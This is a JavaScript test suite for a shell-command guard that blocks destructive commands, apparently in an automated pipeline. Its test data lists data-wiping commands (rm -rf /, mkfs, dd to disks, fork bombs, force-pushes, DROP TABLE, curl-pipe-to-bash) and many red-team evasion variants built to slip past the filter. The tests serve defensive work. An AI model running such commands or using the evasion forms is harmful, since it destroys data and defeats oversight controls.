import assert from 'node:assert/strict';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import test from 'node:test';
import { checkCommand } from './cmd-guard.mjs';

const exec = promisify(execFile);
const block = cmd => checkCommand(cmd);
const expectBlock = (cmd, severity) => {
  const r = block(cmd);
  assert.equal(r.decision, 'block', `expected block: ${cmd}`);
  if (severity) assert.equal(r.severity, severity, `severity for ${cmd}`);
  return r;
};
const expectAllow = cmd => {
  const r = block(cmd);
  assert.equal(r.decision, 'allow', `expected allow: ${cmd} (got ${JSON.stringify(r)})`);
};

// --- CRITICAL ---------------------------------------------------------------

const critical = [
  'rm -rf /',
  'rm -rf ~',
  'rm -rf ~/',
  'rm -rf .',
  'rm -rf ..',
  'rm -rf $HOME',
  'rm -rf /*',
  'rm -rf / --no-preserve-root',
  'mkfs.ext4 /dev/sda1',
  'mkfs /dev/sda',
  'dd if=/dev/zero of=/dev/sda bs=1M',
  'dd of=/dev/nvme0n1 if=img.bin',
  'git push --force origin main',
  'git push -f origin main',
  'git push --force-all',
  'git -C /repo push -f origin main',
  'git --git-dir=/repo/.git push --force',
  'git -c user.email=a@b push -f',
  'git reset --hard HEAD~1',
  'git clean -fd',
  'git clean -fdx',
  'psql -c "DROP TABLE users"',
  'echo ok; DROP DATABASE prod',
  'sqlite3 app.db "TRUNCATE TABLE events"',
  'gcloud compute instances delete vm1 --quiet',
  'gcloud --project p123 sql instances delete db',
  'kubectl delete pod nginx',
  'kubectl -n prod delete deployment web',
  'kubectl --context prod delete ns staging',
  'kubectl drain node-1',
  'docker system prune -a',
  'docker -H tcp://host:2375 system prune -a --volumes',
  'docker --context remote system prune --all',
  'chmod -R 777 /',
  'chmod -R 777 ~',
  'chown -R root:root /',
  'shutdown -h now',
  'reboot',
  ':(){ :|:& };:',
  'bomb() { bomb|bomb& };bomb',
];
for (const cmd of critical) {
  test(`CRITICAL: ${cmd}`, () => expectBlock(cmd, 'critical'));
}

// --- ORDINARY ---------------------------------------------------------------

const ordinary = [
  'rm -rf src/generated',
  'rm -rf /var/tmp/scratch-work',
  'git branch -D feature-x',
  'git checkout -- .',
  'git checkout .',
  'git restore .',
  'docker rm -f container1',
  'docker -H unix:///sock rm -f c1',
  'kill -9 -1',
  'kill -SIGKILL 1',
  'docker system prune',
  'find /tmp/old -name "*.log" -delete',
];
for (const cmd of ordinary) {
  test(`ORDINARY: ${cmd}`, () => expectBlock(cmd, 'ordinary'));
}

// --- обходы экранирования/обёрток (red team) --------------------------------

const evasions = [
  ['\\rm -rf /', 'critical'],
  ['/bin/rm -rf /', 'critical'],
  ['/usr/bin/rm -rf ~', 'critical'],
  ['command rm -rf /', 'critical'],
  ['env rm -rf /', 'critical'],
  ['env FOO=1 -i rm -rf /', 'critical'],
  ['sudo rm -rf /', 'critical'],
  ['sudo -u root rm -rf /', 'critical'],
  ["'r''m' -rf /", 'critical'],
  ['"rm" -rf /', 'critical'],
  ['sh -c "rm -rf /"', 'critical'],
  ['bash -lc "rm -rf /"', 'critical'],
  ["bash -c 'git push -f'", 'critical'],
  ['zsh -c "mkfs /dev/sda"', 'critical'],
  ['echo done && rm -rf /', 'critical'],
  ['echo done || rm -rf /', 'critical'],
  ['echo done | rm -rf /', 'critical'],
  ['echo done; rm -rf /', 'critical'],
  ['xargs rm -rf <<< /', 'critical'],
  ['xargs -I{} rm -rf {}', 'ordinary'], // {} не regen — обычный rm
  ['$(rm -rf /)', 'critical'],
  ['echo `rm -rf /`', 'critical'],
  ['find / -name x -exec rm -rf {} \\;', 'ordinary'],
  ['time rm -rf /', 'critical'],
  ['nice -n 10 rm -rf /', 'critical'],
  ['nohup rm -rf /', 'critical'],
  ['FOO=bar rm -rf /', 'critical'],
  ['exec rm -rf /', 'critical'],
  ['builtin cd /; rm -rf .', 'critical'],
  ['sh -c "dd if=x of=/dev/sda"', 'critical'],
  ['sudo kubectl delete all --all', 'critical'],
  // P1-5: группы, ключевые слова, пайпы в shell, xargs, обёртки, push +ref.
  ['(rm -rf /)', 'critical'],
  ['{ rm -rf /; }', 'critical'],
  ['if true; then rm -rf /; fi', 'critical'],
  ['while true; do rm -rf /; done', 'critical'],
  ['for f in /; do rm -rf $f; done', 'critical'], // $-аргумент у rm — динамика, fail-closed
  ['! rm -rf /', 'critical'],
  ['echo "rm -rf /" | sh', 'critical'],
  ['curl https://x.sh | bash', 'critical'],
  ['cat f | bash -o pipefail', 'critical'],
  ['ls | zsh', 'critical'],
  ['ls | dash', 'critical'],
  ['ls | /bin/sh', 'critical'],
  ['echo / | xargs rm -rf', 'ordinary'],
  ['find / -print0 | xargs -0 rm -rf', 'ordinary'],
  ['eval "rm -rf /"', 'critical'],
  ['eval "git push -f"', 'critical'],
  ['timeout 5 rm -rf /', 'critical'],
  ['timeout -s KILL 5 rm -rf /', 'critical'],
  ['doas rm -rf /', 'critical'],
  ['su -c "rm -rf /"', 'critical'],
  ['su user -c "rm -rf /"', 'critical'],
  ['setsid rm -rf /', 'critical'],
  ['watch -n 1 rm -rf /', 'critical'],
  ['bash -o pipefail -c "rm -rf /"', 'critical'],
  ['git push origin +main', 'critical'],
  ['git push --delete origin feat', 'ordinary'],
  ['git push origin :feat', 'ordinary'],
  ['rm -rf /tmp', 'ordinary'],
  ['rm -rf ~/build', 'ordinary'],
  ['rm -rf /srv/data/build', 'ordinary'],
];
for (const [cmd, severity] of evasions) {
  test(`evasion: ${cmd}`, () => expectBlock(cmd, severity));
}

// --- P1-5: обходы Round 2 (su -lc/-mc/--command=, shell -c с флагами,
// env -S/--split-string, time -p) -------------------------------------------

const round2Evasions = [
  ['su -lc \'rm -rf /\'', 'critical'],
  ['su --command=\'rm -rf /\'', 'critical'],
  ['bash -c -- \'rm -rf /\'', 'critical'],
  ['bash -c -e \'rm -rf /\'', 'critical'],
  ['sh -c -x \'rm -rf /\'', 'critical'],
  ['env -S \'rm -rf /\'', 'critical'],
  ['env -S\'rm -rf /\'', 'critical'],
  ['env --split-string=\'rm -rf /\'', 'critical'],
  ['time -p rm -rf /', 'critical'],
  // Round 3: bash принимает опции с '+' так же, как с '-'.
  ['bash +e -c \'rm -rf /\'', 'critical'],
  ['bash +o pipefail -c \'rm -rf /\'', 'critical'],
  ['bash -c +e \'rm -rf /\'', 'critical'],
  ['bash -c +o pipefail \'rm -rf /\'', 'critical'],
  // Round 4: '+c' исполняет строку так же, как '-c' (bash 5.2 и sh).
  ['bash +c \'rm -rf /\'', 'critical'],
  ['sh +c \'rm -rf /\'', 'critical'],
  ['bash +xc \'rm -rf /\'', 'critical'],
  ['bash +ec \'rm -rf /\'', 'critical'],
];
for (const [cmd, severity] of round2Evasions) {
  test(`evasion (round 2): ${cmd}`, () => expectBlock(cmd, severity));
}

test('round 2: варианты обвёрток не ломают safe-команды', () => {
  for (const cmd of ['bash -c \'echo hi\'', 'env -S \'echo hi\'',
    'env -u FOO ls', 'time -p ls', 'su -s /bin/zsh -c \'echo hi\'',
    'bash -c -o pipefail \'echo hi\'', 'bash +e script.sh',
    'bash +e -c \'echo hi\'', 'bash -c +e \'echo hi\'',
    'bash +c \'echo hi\'', 'sh +c \'echo hi\'', 'bash +x script.sh']) {
    expectAllow(cmd);
  }
});

// --- 0 false positives ------------------------------------------------------

const allowed = [
  'rm -rf node_modules',
  'rm -rf node_modules .next dist',
  'rm -rf ./node_modules',
  'rm -rf build .cache __pycache__ .pytest_cache target coverage .turbo tmp .vite',
  'git push --force-with-lease origin feature-x',
  'git push --force-if-includes --force-with-lease origin feature-x',
  'git push origin feature-x',
  'git checkout main',
  'git checkout -b new-branch',
  'git branch -d merged-branch',
  'git reset --soft HEAD~1',
  'git clean -n',
  'rm file.txt',
  'rm -f tmp.log',
  'docker rm container1',
  'docker stop c1',
  'kubectl get pods',
  'gcloud compute instances list',
  'echo "DROP TABLE" | cat', // строка в аргументе echo — всё равно блок? см. ниже
];

test('0 FP: rm -rf node_modules и прочие REGEN_DIRS', () => {
  for (const cmd of allowed.slice(0, 4)) expectAllow(cmd);
});
test('0 FP: git push --force-with-lease / --force-if-includes в feature-ветку', () => {
  expectAllow('git push --force-with-lease origin feature-x');
  expectAllow('git push --force-if-includes --force-with-lease origin feature-x');
  expectAllow('git push origin feature-x');
  expectAllow('git push origin feat/main-fix');
  expectAllow('git push upstream bugfix');
});
test('0 FP: прочие безопасные команды', () => {
  for (const cmd of ['git checkout main', 'git checkout -b new-branch',
    'git branch -d merged-branch', 'git reset --soft HEAD~1', 'git clean -n',
    'rm file.txt', 'rm -f tmp.log', 'docker rm container1', 'docker stop c1',
    'kubectl get pods', 'gcloud compute instances list']) {
    expectAllow(cmd);
  }
});

// DROP TABLE даже внутри строки — сознательно блокируем: текст SQL в
// аргументе psql/mysql неотличим от echo на уровне лексера, и ошибка в
// сторону блока безопаснее.
test('DROP TABLE внутри кавычек блокируется (fail-safe)', () => {
  expectBlock('echo "DROP TABLE" | cat', 'critical');
});

test('empty/nonsense input allows', () => {
  expectAllow('');
  expectAllow('   ');
  expectAllow('echo hello');
  expectAllow('ls -la /');
  expectAllow('cat /dev/sda');
});

test('hard timeout: degenerate input fails closed', () => {
  const huge = `x `.repeat(2_000_000);
  const r = checkCommand(`rm -rf node_modules && ${huge}`, { timeoutMs: 1 });
  assert.equal(r.decision, 'block');
  assert.equal(r.rule, 'guard_timeout');
});

test('deep/massive recursion is bounded and fails closed on budget', () => {
  const massive = Array.from({ length: 60000 }, () => '$(echo x)').join(' ');
  const r = checkCommand(massive, { timeoutMs: 200 });
  assert.equal(r.decision, 'block');
  assert.equal(r.rule, 'guard_timeout');
});

test('CLI --test prints decision JSON', async () => {
  const { stdout } = await exec('node',
    ['board_pipeline/cmd-guard.mjs', '--test', 'rm -rf /'], { cwd: process.cwd() });
  const r = JSON.parse(stdout);
  assert.equal(r.decision, 'block');
  assert.equal(r.severity, 'critical');
});

test('CLI --test on safe command allows', async () => {
  const { stdout } = await exec('node',
    ['board_pipeline/cmd-guard.mjs', '--test', 'rm -rf node_modules']);
  assert.equal(JSON.parse(stdout).decision, 'allow');
});

test('mixed pipeline: allow segment + critical segment blocks', () => {
  expectBlock('rm -rf node_modules && echo ok && git push -f', 'critical');
  expectBlock('git status; docker system prune -a', 'critical');
});

test('AUDIT-0c: command substitution внутри двойных кавычек блокируется', () => {
  expectBlock('echo "$(rm -rf /)"', 'critical');
  expectBlock('echo "`rm -rf /`"', 'critical');
  expectAllow('echo "\\$(rm -rf /)"');
  expectAllow('echo "\\`rm -rf /\\`"');
  expectAllow("echo '$(rm -rf /)'");
  expectAllow("echo '`rm -rf /`'");
});

test('AUDIT-0c: ведущие редиректы не прячут команду в argv[0]', () => {
  for (const cmd of [
    '>> /tmp/x rm -rf /',
    '2>> /tmp/x rm -rf /',
    '1>> /tmp/x rm -rf /',
    '&> /tmp/x rm -rf /',
    '<<< x rm -rf /',
  ]) {
    expectBlock(cmd, 'critical');
  }
});

test('AUDIT-0c: path traversal в REGEN_DIRS и rm -r по корню блокируются', () => {
  expectBlock('rm -rf ../../../tmp', 'ordinary');
  expectBlock('rm -rf ../build', 'ordinary');
  expectBlock('rm -r /', 'critical');
  expectBlock('rm -R ~', 'critical');
});

test('AUDIT-0c: проверяются все -exec/-execdir/-ok/-okdir clauses в find', () => {
  expectBlock('find . -exec true \\; -exec rm -rf / \\;', 'critical');
  expectBlock('find . -exec true \\; -execdir rm -rf / \\;', 'critical');
  expectBlock('find . -exec true \\; -ok rm -rf / \\;', 'critical');
  expectBlock('find . -exec true \\; -okdir rm -rf / \\;', 'critical');
});

test('AUDIT-0c: chmod/chown --recursive по корню блокируются', () => {
  expectBlock('chmod --recursive 777 /', 'critical');
  expectBlock('chown --recursive root:root /', 'critical');
});

test('AUDIT-0c: benign regeneration deletes remain allowed', () => {
  expectAllow('rm -rf node_modules');
  expectAllow('rm -rf dist');
  expectAllow('rm -rf build/.cache');
});

test('AUDIT-0c regression: вложенные кавычки внутри подстановок не обрывают разбор', () => {
  expectBlock('echo "$(rm -rf "/")"', 'critical');
  expectBlock('echo "`rm -rf "/"`"', 'critical');
  expectBlock('echo "$(echo "$(rm -rf "/")")"', 'critical');
  expectBlock('echo $(rm -rf "/")', 'critical');
  expectBlock('echo "$(rm -rf ~/)"', 'critical');
  expectAllow('echo "\\$(rm -rf /)"');
  expectAllow("echo '$(rm -rf \"/\")'");
});

test('AUDIT-0c regression: fd-дублирование 2>&1 не разбивает сегменты команды', () => {
  expectBlock('2>&1 rm -rf /', 'critical');
  expectBlock('2>& 1 rm -rf /', 'critical');
  expectBlock('1>&2 rm -rf /', 'critical');
  expectBlock('0<&1 rm -rf /', 'critical');
  expectBlock('ls 2>&1; rm -rf /', 'critical');
  expectBlock('true & rm -rf /', 'critical');
  expectAllow('echo hi 2>&1');
  expectAllow('echo hi 2>&1 | cat');
  expectAllow('echo out 1>&2');
});

test('AUDIT-0c regression: оператор редиректа внутри слова не скрывает цель rm', () => {
  expectBlock('rm -rf />&2', 'critical');
  expectBlock('rm -rf />x', 'critical');
  expectBlock('rm -rf / 2>&1', 'critical');
  expectBlock('rm -rf ~>/dev/null', 'critical');
  expectAllow('echo hi>/tmp/x');
  expectAllow('echo hi 2>/dev/null');
});

// --- v2.0 cross-review: маркер динамической подстановки в argv --------------

test('v2: sentinel в argv[0] — команда из подстановки блокируется', () => {
  for (const cmd of [
    '$(echo rm) -rf /',
    '$(echo rm) -rf node_modules',
    '`echo rm` -rf /',
    'x`echo y`z -rf /',
    '$(echo git) push --force',
  ]) {
    expectBlock(cmd, 'critical');
  }
});

test('v2: destructive verbs с sentinel-аргументами блокируются', () => {
  for (const cmd of [
    'rm -rf $(echo /)',
    'rm -rf `echo /`',
    'git push $(echo --force) origin main',
    'git push $(echo --force) origin feature-x',
    'git reset $(echo --hard)',
    'git clean $(echo -fd)',
    'dd if=x of=$(echo /dev/sda)',
    'chmod -R $(echo 777) /',
    'docker rm $(echo -f) c1',
    'kubectl delete $(echo pod) x',
  ]) {
    expectBlock(cmd, 'critical');
  }
});

test('v2: подстановка процесса <(...)/>(...) — sentinel во внешнем argv', () => {
  expectBlock('bash <(echo rm -rf /)', 'critical');
  expectBlock('sh <(echo echo hi)', 'critical');
  expectBlock('bash <(cat x)', 'critical');
  expectBlock('rm -rf <(echo x)', 'critical');
  expectBlock('rm -rf >(echo x)', 'critical');
  // diff <(a) <(b) — не деструктивный глагол: содержимое подстановок
  // разбирается рекурсивно, сам diff остаётся разрешённым.
  expectAllow('diff <(echo a) <(echo b)');
  expectAllow('cat <(echo hi)');
  expectAllow('echo hi');
});

test('v2: неэкранированный $ в аргументах деструктивных глаголов — fail-closed', () => {
  expectBlock('rm -rf $TARGET', 'critical');
  expectBlock('git push $FLAGS origin feature-x', 'critical');
  expectBlock('git reset $MODE', 'critical');
  expectBlock('dd of=$OUT if=x', 'critical');
  // Не деструктивные команды с переменными остаются разрешёнными.
  expectAllow('echo $HOME');
  expectAllow('ls $DIR');
  expectAllow('git commit -m "$msg"');
  expectAllow('git log --oneline');
});

test('v2: рекурсия за пределом глубины — fail-closed recursion_depth_exceeded', () => {
  let deep = 'echo x';
  for (let i = 0; i < 20; i++) deep = `$(${deep})`;
  const r = checkCommand(deep);
  assert.equal(r.decision, 'block');
  assert.equal(r.rule, 'recursion_depth_exceeded');
  assert.equal(r.severity, 'critical');
});

test('v2: глубокие подстановки с деструктивным дном не прячутся за глубиной', () => {
  let deep = 'rm -rf /';
  for (let i = 0; i < 20; i++) deep = `$(${deep})`;
  const r = checkCommand(deep);
  assert.equal(r.decision, 'block');
});

test('v2: цепочка eval за пределом глубины — recursion_depth_exceeded', () => {
  const deep = `${'eval '.repeat(20)}echo hi`;
  const r = checkCommand(deep);
  assert.equal(r.decision, 'block');
  assert.equal(r.rule, 'recursion_depth_exceeded');
  assert.equal(checkCommand(`${'eval '.repeat(20)}rm -rf /`).rule,
    'recursion_depth_exceeded');
  // Умеренная вложенность разбирается точно, без ложного срабатывания глубины.
  expectAllow('eval eval echo hi');
  expectBlock('eval eval "rm -rf /"', 'critical');
});

test('v2: цепочка обёрток за пределом глубины — recursion_depth_exceeded', () => {
  const deep = `${'sudo '.repeat(20)}rm -rf /`;
  const r = checkCommand(deep);
  assert.equal(r.decision, 'block');
  assert.equal(r.rule, 'recursion_depth_exceeded');
});

test('v2: умеренная вложенность по-прежнему разбирается точно', () => {
  expectBlock('sh -c "sh -c \'rm -rf /\'"', 'critical');
  expectAllow('sh -c "echo $(echo hi)"');
  expectAllow('echo $(echo $(echo hi))');
});

test('v2: REGEN_DIRS ужесточены — метасимволы/обходы не считаются регенерацией', () => {
  expectBlock('rm -rf build dir', 'ordinary'); // пробел дробит на две цели, одна не regen
  expectBlock('rm -rf node_modules/..', 'ordinary');
  expectBlock('rm -rf ./../dist', 'ordinary');
  expectBlock('rm -rf dist$', 'critical'); // '$' в цели rm — динамика, fail-closed
  expectBlock('rm -rf build`echo x`', 'critical'); // sentinel в цели rm
  expectBlock('rm -rf /tmp', 'ordinary');
  expectBlock('rm -rf ~/build', 'ordinary');
  expectAllow('rm -rf node_modules');
  expectAllow('rm -rf dist');
  expectAllow('rm -rf build/.cache');
  expectAllow('rm -rf ./node_modules');
  expectAllow('rm -rf my-project/dist');
});

test('v2: рекурсивный rm без -f по системным/домашним путям блокируется', () => {
  for (const cmd of [
    'rm -r /etc',
    'rm -r /',
    'rm -r /etc/nginx',
    'rm -r /usr/local',
    'rm -r /var/lib',
    'rm -r /bin',
    'rm -r ~/projects',
    'rm -r ~',
    'rm -R /root',
    'rm -r /home/user',
  ]) {
    expectBlock(cmd, 'critical');
  }
  // Рекурсивный rm без -f по относительным проектным целям — вне scope правила.
  expectAllow('rm -r ./scratch-dir');
  expectAllow('rm file.txt');
});

test('v2: push в защищённые ветки блокируется даже без force', () => {
  for (const cmd of [
    'git push origin main',
    'git push origin master',
    'git push origin production',
    'git push origin release/1.0',
    'git push origin release/2.3.4-rc',
    'git push origin refs/heads/main',
    'git push origin refs/heads/master',
    'git push origin HEAD:main',
    'git push origin main:main',
    'git push origin feature:main',
    'git push upstream main',
    'git push --force-with-lease origin main',
    'git -C /repo push origin main',
  ]) {
    expectBlock(cmd, 'critical');
  }
});

test('v2: push в явные feature-ветки остаётся разрешённым', () => {
  for (const cmd of [
    'git push origin feature-x',
    'git push origin feat/main-fix',
    'git push origin domain/main-page',
    'git push origin fix',
    'git push -u origin feature-x',
    'git push --force-with-lease origin feature-x',
    'git push -o ci.skip origin feature-x',
    'git push origin feature-x:feature-y',
    'git push origin HEAD:feature-x',
    'git push -- origin feature-x',
  ]) {
    expectAllow(cmd);
  }
});

test('P1-2: bare, implicit-destination, bulk and repository-flag pushes fail closed', () => {
  for (const [cmd, rule] of [
    ['git push', 'git_push_implicit'],
    ['git push -u', 'git_push_implicit'],
    ['git push origin', 'git_push_implicit'],
    ['git push upstream', 'git_push_implicit'],
    ['git push --tags', 'git_push_implicit'],
    ['git push --force-if-includes --force-with-lease', 'git_push_implicit'],
    ['git push origin HEAD', 'git_push_implicit'],
    ['git push origin @', 'git_push_implicit'],
    ['git push origin @{u}', 'git_push_implicit'],
    ['git push origin refs/heads/' + '*', 'git_push_implicit'],
    ['git push --all', 'git_push_bulk'],
    ['git push origin --all', 'git_push_bulk'],
    ['git push --branches origin feature-x', 'git_push_bulk'],
    ['git push --mirror', 'git_push_force'],
    ['git push --repo=origin feat/x', 'git_push_repository_ambiguous'],
    ['git push --repo origin feat/x', 'git_push_repository_ambiguous'],
    ['git push --rep=origin feat/x', 'git_push_repository_ambiguous'],
    ['git push --no-repo origin feat/x', 'git_push_repository_ambiguous'],
  ]) {
    assert.equal(expectBlock(cmd, 'critical').rule, rule, cmd);
  }
});

test('v2: динамическая подкоманда git блокируется', () => {
  expectBlock('git $(echo push) origin main', 'critical');
  expectBlock('git $(echo reset) --hard', 'critical');
  expectBlock('git $SUB status', 'critical');
  // Не деструктивные подкоманды с литеральными аргументами — разрешены.
  expectAllow('git status');
  expectAllow('git log --oneline -5');
  expectAllow('git diff HEAD~1');
});
